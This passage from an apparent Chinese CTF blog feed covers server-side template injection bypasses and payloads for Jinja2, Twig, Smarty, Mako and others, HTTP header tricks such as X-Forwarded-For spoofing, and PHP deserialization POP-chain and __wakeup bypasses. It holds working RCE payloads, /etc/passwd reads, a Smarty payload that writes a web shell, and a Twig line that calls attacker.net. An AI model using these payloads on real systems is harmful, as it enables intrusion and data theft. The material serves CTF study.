id="过滤了-和"><a href="#过滤了-和" class="headerlink" title="过滤了.和[]"></a>过滤了.和[]</h4><p>.过滤，用[]或者|attr()<br>.__class__.-&gt;[‘__class__‘]-&gt;|attr(‘__class__‘)<br>[]过滤了，用 pop 或者__getitem__</p><pre><code>{{&#39;&#39;.__class__.__mro__.__getitem__(0)}}</code></pre><p>[40]-&gt;pop(40)</p><h4 id="过滤了-class-bases-等关键字"><a href="#过滤了-class-bases-等关键字" class="headerlink" title="过滤了 class,bases 等关键字"></a>过滤了 class,bases 等关键字</h4><p>1.拼接</p><pre><code>{{&#39;&#39;[&#39;__cl&#39;&#39;ass__&#39;][&#39;__mr&#39;&#39;o__&#39;][1][&#39;__subc&#39;&#39;lasses__&#39;]()[140][&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;popen&#39;](&#39;ls&#39;).read()}}</code></pre><p>2.倒置<br>.__class__. -&gt; ‘’[‘__ssalc__‘[::-1]]<br>3.格式化</p><pre><code>{%set ca=[&quot;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&quot;.format(95,95,99,108,97,115,115,95,95)]}{%set ca=[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]%}{%set ca=&#39;%c%c%c%c%c%c%c%c%c&#39;%(95,95,99,108,97,115,115,95,95)%}</code></pre><p>这个没写脚本，用的有点少<br>4.编码绕过<br>（1）unicode<br>__class__-&gt;[‘\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f’]<br>编码可在 cyberchef 的 escape unicode characters 中找到<br>（2）hex<br>__class__-&gt;[‘\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f’]</p><h4 id="fenjing-一把梭"><a href="#fenjing-一把梭" class="headerlink" title="fenjing 一把梭"></a>fenjing 一把梭</h4><p><a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><h4 id="fenjing-python-破解脚本"><a href="#fenjing-python-破解脚本" class="headerlink" title="fenjing python 破解脚本"></a>fenjing python 破解脚本</h4><p>waf 黑名单生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;０&quot;</span>,<span class="string">&quot;１&quot;</span>,<span class="string">&quot;２&quot;</span>,<span class="string">&quot;３&quot;</span>,<span class="string">&quot;４&quot;</span>,<span class="string">&quot;５&quot;</span>,<span class="string">&quot;６&quot;</span>,<span class="string">&quot;７&quot;</span>,<span class="string">&quot;８&quot;</span>,<span class="string">&quot;９&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>waf 返回文本生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://10.137.0.28:5000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    time.sleep(<span class="number">0.02</span>)  <span class="comment"># 防止请求发送过多</span></span><br><span class="line">    resp = requests.get(URL, timeout=<span class="number">10</span>, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;)</span><br><span class="line">    waf_text = <span class="string">&quot;BAD&quot;</span>  <span class="comment"># 被waf返回文本</span></span><br><span class="line">    <span class="keyword">return</span> waf_text <span class="keyword">not</span> <span class="keyword">in</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;ls /&quot;</span></span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自行修改~</p><h2 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig(PHP)"></a>Twig(PHP)</h2><ul><li><p>{{7*7}} &#x3D; 49</p></li><li><p>${7*7} &#x3D; ${7*7}</p></li><li><p>{{7*’7’}} &#x3D; 49</p></li><li><p>{{1&#x2F;0}} &#x3D; Error</p></li><li><p>{{foobar}} Nothing</p><pre><code>  #Get Info  {{_self}} #(Ref. to current application)  {{_self.env}}  {{dump(app)}}  {{app.request.server.all|join(&#39;,&#39;)}}  #File read  &quot;{{&#39;/etc/passwd&#39;|file_excerpt(1,30)}}&quot;@  #Exec code  {{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;whoami&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;id;uname -a;hostname&quot;)}}  {{[&#39;id&#39;]|filter(&#39;system&#39;)}}  {{[&#39;cat\x20/etc/passwd&#39;]|filter(&#39;system&#39;)}}  {{[&#39;cat$IFS/etc/passwd&#39;]|filter(&#39;system&#39;)}}  {{[&#39;id&#39;,&quot;&quot;]|sort(&#39;system&#39;)}}  #Hide warnings and errors for automatic exploitation  {{[&quot;error_reporting&quot;, &quot;0&quot;]|sort(&quot;ini_set&quot;)}}</code></pre></li></ul><h2 id="Tornado-render-python"><a href="#Tornado-render-python" class="headerlink" title="Tornado render(python)"></a>Tornado render(python)</h2><ul><li><p>{{7*7}} &#x3D; 49</p></li><li><p>${7*7} &#x3D; ${7*7}</p></li><li><p>{{foobar}} &#x3D; Error</p></li><li><p>{{7*’7’}} &#x3D; 7777777</p><pre><code>  {% import os %}{{ os.popen(&quot;whoami&quot;).read() }}  {{handler.settings}}</code></pre></li></ul><h2 id="smarty-PHP"><a href="#smarty-PHP" class="headerlink" title="smarty(PHP)"></a>smarty(PHP)</h2><pre><code>{$smarty.version}{if system(&#39;ls&#39;)}{/if}{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}{function+name=&#39;rce(){};@eval($_POST[1]);function%0a%0a&#39;}{/function}{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}{literal}alert(&#39;xss&#39;);{/literal}{if readfile(&#39;/flag&#39;)}{/if}</code></pre><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><pre><code>{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre><h2 id="Mako-python"><a href="#Mako-python" class="headerlink" title="Mako(python)"></a>Mako(python)</h2><pre><code>&lt;%import osx=os.popen(&#39;id&#39;).read()%&gt;${x}</code></pre><h2 id="GoLang"><a href="#GoLang" class="headerlink" title="GoLang"></a>GoLang</h2><p>在 Go 的模板引擎中，可以通过特定的有效负载来确认其使用情况：</p><ul><li><p>{{ . }}：显示数据结构输入。例如，如果具有 Password attribute 时， {{ .Password }} 可能会暴露它。</p></li><li><p>{{printf “%s” “ssti” }}：应显示字符串 “ssti”。</p></li><li><p>{{html “ssti”}}、 {{js “ssti”}}：这些有效负载应返回 “ssti” ，而不附加 “html” 或 “js”</p></li></ul><p>对于 Go 中通过 SSTI 的 RCE，可以调用对象方法。例如，如果提供的对象具有 System 方法执行命令，它可以被利用，例如 {{ .System “ls” }}。访问源代码通常是利用这一点所必需的，如给定的示例所示：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> Secret (test <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">    out, \_ := exec.Command(test).CombinedOutput()</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">几乎基于jinja2模版的ssti注入</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>常见的各种http要求以及对应的headers</title>
    <link href="https://blog.hatchet.top/posts/93fc8735.html"/>
    <id>https://blog.hatchet.top/posts/93fc8735.html</id>
    <published>2024-08-25T13:38:50.000Z</published>
    <updated>2024-09-20T12:21:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GET-传参"><a href="#GET-传参" class="headerlink" title="GET 传参"></a>GET 传参</h1><p>传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0<br>xxx.com&#x2F;?a&#x3D;1&amp;b&#x3D;2&amp;c[0]&#x3D;3&amp;c[1]&#x3D;4&amp;d[]&#x3D;5</p><h1 id="POST-传参"><a href="#POST-传参" class="headerlink" title="POST 传参"></a>POST 传参</h1><p>把 GET 请求改为 POST,如果用的 burp 可以用这个一键切<br><img src="/img/http/change_request.png"></p><p>不能切的话把 GET 改为 POST，在下面加<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 0<br>Content-Length 需要改数值，建议勾选 burp 的修改 body 长度（默认勾选）不用手动更改，数值取决于你 POST 传参的长度，如 a&#x3D;4 长度为 3<br>当存在 Transfer-Encoding: chunked 时，Content-Length 会被忽略<br>没有 POST 传参最后要留两行空，不然会无法打开<br>POST 参数跟 http 头之间要空一行，后面不能有空行</p><p><img src="/img/http/post_request.png"></p><h1 id="PUT-等更多类型的传参"><a href="#PUT-等更多类型的传参" class="headerlink" title="PUT 等更多类型的传参"></a>PUT 等更多类型的传参</h1><p>直接把 GET 开头改成 PUT 就行</p><h1 id="要求-ip-地址为-127-0-0-1-要求本地权限"><a href="#要求-ip-地址为-127-0-0-1-要求本地权限" class="headerlink" title="要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限"></a>要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限</h1><p>这种要求如果在 http 题中只要 xff 伪造 ip 就行，如果要 ssrf 伪造它就不是 http 题</p><p>X-Forwarded-For: 127.0.0.1<br>Client-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>这三个任选添加，都可能通过，大小写随意，注意 xff 的 ed 不要少写。</p><h1 id="要求挂代理"><a href="#要求挂代理" class="headerlink" title="要求挂代理"></a>要求挂代理</h1><p>via: xxx.vip</p><h1 id="SERVER-‘FLAG’-’123’等-php-参数"><a href="#SERVER-‘FLAG’-’123’等-php-参数" class="headerlink" title="$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数"></a>$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数</h1><p>FLAG: 123</p><h1 id="要求改-UA-浏览器"><a href="#要求改-UA-浏览器" class="headerlink" title="要求改 UA &#x2F; 浏览器"></a>要求改 UA &#x2F; 浏览器</h1><p>User-Agent: Firefox Browser</p><h1 id="要求你的邮件地址"><a href="#要求你的邮件地址" class="headerlink" title="要求你的邮件地址"></a>要求你的邮件地址</h1><p>From: <a href="mailto:&#120;&#120;&#x78;&#x40;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#109;">&#120;&#120;&#x78;&#x40;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#109;</a></p><h1 id="要求来自-网址-origin"><a href="#要求来自-网址-origin" class="headerlink" title="要求来自 网址 (origin)"></a>要求来自 网址 (origin)</h1><p>Referer: xxx.org</p><h1 id="要求改-Cookie"><a href="#要求改-Cookie" class="headerlink" title="要求改 Cookie"></a>要求改 Cookie</h1><p>格式如 Cookie: user&#x3D;admin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GET-传参&quot;&gt;&lt;a href=&quot;#GET-传参&quot; class=&quot;headerlink&quot; title=&quot;GET 传参&quot;&gt;&lt;/a&gt;GET 传参&lt;/h1&gt;&lt;p&gt;传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0&lt;br&gt;xxx.com&amp;#x2F;?a&amp;#x</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>php的pop链构造&amp;反序列化</title>
    <link href="https://blog.hatchet.top/posts/32daafef.html"/>
    <id>https://blog.hatchet.top/posts/32daafef.html</id>
    <published>2024-08-25T11:46:24.000Z</published>
    <updated>2024-09-25T10:15:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的开始和结尾。</p><h1 id="部分魔术方法触发方法"><a href="#部分魔术方法触发方法" class="headerlink" title="部分魔术方法触发方法"></a>部分魔术方法触发方法</h1><pre><code>__wakeup() 使用 unserialize()时优先触发__sleep() 使用 serialize()时优先触发__construct() 创建对象时自动触发__destruct() 对象被销毁时自动触发__get() 用于从不可访问的属性读取数据 $this-&gt;known-&gt;unknown;__call() 在对象上下文中调用不可访问的方法时触发 $this-&gt;known-&gt;unknown();__callStatic() 在静态上下文中调用不可访问的方法时触发 static $known;$this-&gt;known-&gt;unknown();__set() 用于将数据写入不可访问的属性 $this-&gt;known-&gt;unknown=&#39;set&#39;;__toString() 把类当作字符串使用时触发 echo $this-&gt;known;__invoke() 当尝试以调用函数的方式调用一个对象时触发 $this-&gt;known();__isset() 在不可访问的属性上调用 isset()或 empty()触发__unset() 在不可访问的属性上使用 unset()时触发</code></pre><h1 id="不含绕过的链子构造"><a href="#不含绕过的链子构造" class="headerlink" title="不含绕过的链子构造"></a>不含绕过的链子构造</h1><p>__wakeup(),__construct(),__destruct() 都可以看做开头，优先级从左到右。你要做的，就是引导这个绳子头，直至穿到危险函数。</p><p>我们来看一道例题，这是我在学习构造 pop 链时做出的第一道题，出自 Geek Challenge 2024 unsign</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();<span class="comment">#$this-&gt;known();  invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;<span class="comment">#$this-&gt;known-&gt;known;  get</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);<span class="comment">#危险函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们注意到 class web 下存在一种很危险的格式<br>**$eva1($this-&gt;interesting);**也就是在 $eva1&#x3D;”eval”时，就能用 eval()了，所以它作为尾。<br>链子总结如下</p><pre><code>syc#cuit__destruct()-&gt;lover#yxx__invoke()-&gt;web#yxx__get()-&gt;eval()</code></pre><p>关键 exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$syc</span>=<span class="keyword">new</span> syc;</span><br><span class="line"><span class="variable">$lover</span>=<span class="keyword">new</span> lover;</span><br><span class="line"><span class="variable">$web</span>=<span class="keyword">new</span> web;</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$syc</span>;</span><br><span class="line"><span class="variable">$url</span>-&gt;cuit=<span class="variable">$lover</span>;</span><br><span class="line"><span class="variable">$lover</span>-&gt;yxx=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$url</span>);<span class="comment">//syc#cuit__destruct()-&gt;lover#yxx__invoke()-&gt;web#yxx__get()-&gt;eval()</span></span><br></pre></td></tr></table></figure><h1 id="需要绕过的链子构造"><a href="#需要绕过的链子构造" class="headerlink" title="需要绕过的链子构造"></a>需要绕过的链子构造</h1><h2 id="private-和-protected-属性的变量"><a href="#private-和-protected-属性的变量" class="headerlink" title="private 和 protected 属性的变量"></a>private 和 protected 属性的变量</h2><p>输出 serialize 时一定要经过编码，基本是 url 编码，如果题目要求 base64 编码就不用先 url 编码了<br>如果你要对 private 和 protected 里的数赋值时，如果 php 版本低可能没回显。<br>养成良好习惯，使用__construct()赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> a=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> b;</span><br><span class="line">    <span class="keyword">protected</span> c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强调下 construct 的赋值方式，不能直接写$b,要写$this-&gt;b,且 function 前加 public。</p><h2 id="str-replace-替换字符导致的字符串逃逸"><a href="#str-replace-替换字符导致的字符串逃逸" class="headerlink" title="str_replace 替换字符导致的字符串逃逸"></a>str_replace 替换字符导致的字符串逃逸</h2><p>比如替换函数为 str_replace(‘SDPCSEC’,’hacker’,$parm);我们注意到每次替换就少了一个字符，但被替换的字符串前的数字没有变，所以我们就可以构造字符个数，每输出一次就会吞掉后面一个字符，最后的参数就由你自己控制了。<br>一个参考的输出程序，可以把篡改字符串放在$a 里，注意开头要加”用于闭合引号</p><h3 id="字符变少"><a href="#字符变少" class="headerlink" title="字符变少"></a>字符变少</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&quot;;s:1:&quot;B&quot;;s:12:&quot;[phpinfo();]&quot;;s:1:&quot;C&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;SDPCSEC&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h3><p>提前闭合，因为反序列化会舍去;}后的任何内容。</p><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="wakeup 绕过"></a>wakeup 绕过</h2><h3 id="增加属性对象绕过（CVE-2016-7124）"><a href="#增加属性对象绕过（CVE-2016-7124）" class="headerlink" title="增加属性对象绕过（CVE-2016-7124）"></a>增加属性对象绕过（CVE-2016-7124）</h3><pre><code>PHP5 &lt; 5.6.25 和 PHP7 &lt; 7.0.10</code></pre><p>我们增加 :{ 前的数字，这会绕过 wakeup 检测。</p><pre><code>O:7:&quot;Secrect&quot;:2:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><p>绕过为</p><pre><code>O:7:&quot;Secrect&quot;:3:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><h3 id="C-开头绕过"><a href="#C-开头绕过" class="headerlink" title="C 开头绕过"></a>C 开头绕过</h3><p>将 O 改成 C 就可以，但是弊端就是这个类中的对象都没有属性了，也就是不能命令执行<br>如果碰到需要命令执行就得多几步了，正好 ArrayObject 内置类可以构造以 C 开头的反序列化 <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p><h2 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h2><pre><code>O:4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>假设此时的匹配为(preg_match(‘&#x2F;username&#x2F;‘, $data));这时你可以把 username 前的 s 大写，并将你要绕过的内容或一部分转为 16 进制，如</p><pre><code>O:4:&quot;Test&quot;:1:&#123;S:8:&quot;\75sername&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>如果此时的匹配为(preg_match(‘&#x2F;O:[%d]’, $data));你可以这么写</p><pre><code>O:+4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h2 id="throw-new-Exception-绕过-GC-回收"><a href="#throw-new-Exception-绕过-GC-回收" class="headerlink" title="throw new Exception()绕过: GC 回收"></a>throw new Exception()绕过: GC 回收</h2><p>参考文献<br><a href="https://blog.csdn.net/Jayjay___/article/details/132463913">https://blog.csdn.net/Jayjay___/article/details/132463913</a></p><h3 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast-destruct"></a>fast-destruct</h3><p>正常 payload</p><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:1;s:4:&quot;1234&quot;;&#125;</code></pre><h4 id="删除末尾花括号"><a href="#删除末尾花括号" class="headerlink" title="删除末尾花括号"></a>删除末尾花括号</h4><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:1;s:4:&quot;1234&quot;;</code></pre><h4 id="改数字：把最后-i-后的数字减少-1"><a href="#改数字：把最后-i-后的数字减少-1" class="headerlink" title="改数字：把最后 i 后的数字减少 1"></a>改数字：把最后 i 后的数字减少 1</h4><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:0;s:4:&quot;1234&quot;;&#125;</code></pre><h3 id="其他回收-php-issue-9618"><a href="#其他回收-php-issue-9618" class="headerlink" title="其他回收(php issue#9618)"></a>其他回收(php issue#9618)</h3><p>版本条件：</p><ul><li>7.4.x - 7.4.30</li><li>8.0.x</li></ul><h4 id="属性值的长度不匹配"><a href="#属性值的长度不匹配" class="headerlink" title="属性值的长度不匹配"></a>属性值的长度不匹配</h4><pre><code>//正常 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:1:&quot;1&quot;;&#125;//外部类属性值长度异常 payload：//先外类__destruct()后内类__wakeup()O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:2:&quot;1&quot;;&#125;O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:1:&quot;12&quot;;&#125;</code></pre><h4 id="去掉内部类的分号"><a href="#去掉内部类的分号" class="headerlink" title="去掉内部类的分号"></a>去掉内部类的分号</h4><p>注：</p><pre><code>这样内部类直接回收，外部类没事，可以直接不执行内部类的wakeup。外部类去掉分号同理。如果内部外部类的花括号紧贴，也可以在两个花括号中间加分号，可绕过内部类wakeup。//正常 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N**;**&#125;s:3:&quot;end&quot;;s:1:&quot;1&quot;;&#125;//去掉了内部类的分号的 